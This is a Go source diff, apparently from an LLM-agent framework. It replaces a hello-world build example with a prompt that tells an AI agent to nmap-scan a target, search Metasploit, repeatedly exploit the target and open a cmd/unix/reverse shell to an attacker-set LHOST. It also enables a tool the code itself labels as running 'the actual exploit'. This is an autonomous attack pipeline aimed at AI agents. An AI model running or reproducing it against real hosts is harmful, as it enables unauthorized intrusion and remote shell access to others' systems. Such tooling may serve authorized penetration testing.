@@ -13,28 +13,16 @@ import (
 	"github.com/rs/zerolog/log"
 )
 
-/*
-  This example shows usage of command executor to create a binary with generated code.
-*/
-
-const BuilderPrompt = `Here is the step by step actions plan, use the command executor tool to create the binary at the end:
-	- Generate a simple go hello world code
-	- Write it to the file (use echo -e or printf with single quotes since echo in bash did not interpret escaped symbols by default, and there is multiple symbols needed to be escaped using single quotes as well)
-	- Initialize go module
-	- Build it
-	- Use pwd to get the working directory
-	- Return me the path to built binary
-`
-
-type NmapToolArgs struct {
-	IP string `json:"ip"`
-}
+const Prompt = `Please scan %s for open ports and generate Metasploit search queries for any found services. ` +
+	`First, try to use nmap with only -F argument. After that try to continiously exploit target, ` +
+	`using %s as LHOST and target address as RHOST and module(s) found from metasploit search. ` +
+	`Use cmd/unix/reverse as payload.'`
 
 func main() {
 	zerolog.SetGlobalLevel(zerolog.DebugLevel)
 	log.Logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr})
 
-	cfg, err := config.NewConfig()
+	cfg, err := config.NewConfig("")
 	if err != nil {
 		log.Fatal().Err(err).Msg("new config")
 	}
@@ -44,21 +32,33 @@ func main() {
 	toolsExecutor, err := tools.NewToolsExecutor(ctx, cfg, tools.WithToolsWhitelist(
 		tools.ReWOOToolDefinition.Name,
 		tools.CommandExecutorDefinition.Name,
+		tools.MsfSearchToolDefinition.Name,
+		tools.ExploitToolDefinition.Name, // WARN! DANGER ZONE! THIS WILL RUN THE ACTUAL EXPLOIT
 	))
 	if err != nil {
 		log.Fatal().Err(err).Msg("new tools executor")
 	}
+	defer func() {
+		if err := toolsExecutor.Cleanup(); err != nil {
+			log.Fatal().Err(err).Msg("tools executor cleanup")
+		}
+	}()
 
-	// Do not cleanup to use the final result
-	// defer func() {
-	// 	if err := toolsExecutor.Cleanup(); err != nil {
-	// 		log.Fatal().Err(err).Msg("tools executor cleanup")
-	// 	}
-	// }()
+	rhost, exists := os.LookupEnv("HACKER_MSF_RHOST")
+	if !exists {
+		log.Fatal().Msg("HACKER_MSF_RHOST env cannot be empty")
+	}
+	lhost, exists := os.LookupEnv("HACKER_MSF_LHOST")
+	if !exists {
+		log.Fatal().Msg("HACKER_MSF_LHOST env cannot be empty")
+	}
+
+	fmt.Printf("Metasploit RHOST: %s, LHOST: %s\n", rhost, lhost)
 
 	rewooQuery := tools.ReWOOToolArgs{
-		Query: BuilderPrompt,
+		Query: fmt.Sprintf(Prompt, rhost, lhost),
 	}
+
 	rewooQueryBytes, err := json.Marshal(rewooQuery)
 	if err != nil {
 		log.Fatal().Err(err).Msg("json marhsal rewooQuery")
